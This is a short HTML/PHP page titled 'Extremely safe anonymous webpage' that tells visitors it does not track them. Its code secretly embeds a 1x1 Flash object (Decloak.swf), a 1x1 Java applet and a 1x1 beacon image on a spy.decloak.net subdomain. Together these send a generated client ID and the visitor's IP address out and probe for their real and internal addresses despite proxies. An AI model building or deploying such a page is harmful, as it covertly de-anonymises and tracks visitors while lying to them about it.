<html>
<head>
<title>Extremely safe anonymous webpage</title>
</head>
<body>

<h3>Welcome! This page is not tracking you in any way.</h3>

<?php
// generate md5 sum set to $cid
$cid = md5("secret" . $_SERVER['REMOTE_ADDR'] . $_SERVER['REMOTE_PORT'] . time() . "secret");
// get ip set to $eip
$eip = '';
if(isset($_SERVER['HTTP_X_FORWARDED_FOR']) && $_SERVER['HTTP_X_FORWARDED_FOR'] != '') {
    $eip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $eip = $_SERVER['REMOTE_ADDR'];
}
?>
<!-- // Flash doesn't like to be hidden // -->
<object
	classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
	codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab"
	width=1
	height=1
>
	<param name="movie" value="Decloak.swf?cid=<?php echo $cid;?>&port=53530&client=<?php echo $eip;?>&hook=" />
	<embed src="Decloak.swf?cid=<?php echo $cid;?>&port=53530&client=<?php echo $eip;?>&hook="
		play="true"
		loop="false"
		allowScriptAccess="always"
		type="application/x-shockwave-flash"
		pluginspage="http://www.macromedia.com/go/getflashplayer"
		width=1
		height=1		
		>
		
	</embed>
</object>

<?php
// instead of 0.0.0.0 it should be $iip signifying the client's internal IP address
$http = "<img src='http://" . $cid . ".http." . $eip . ".0.0.0.0.spy.decloak.net/spin.gif' width=1 height=1/>";
echo $http;
?>

<applet code="HelloWorld.class" mayscript width=1 height=1>
	<param name='External' value='<?php echo $eip;?>'>
	<param name='ClientID' value='<?php echo $cid;?>'>
	<param name='UDPPort'  value='5353'>
</applet>

<body>
</html>
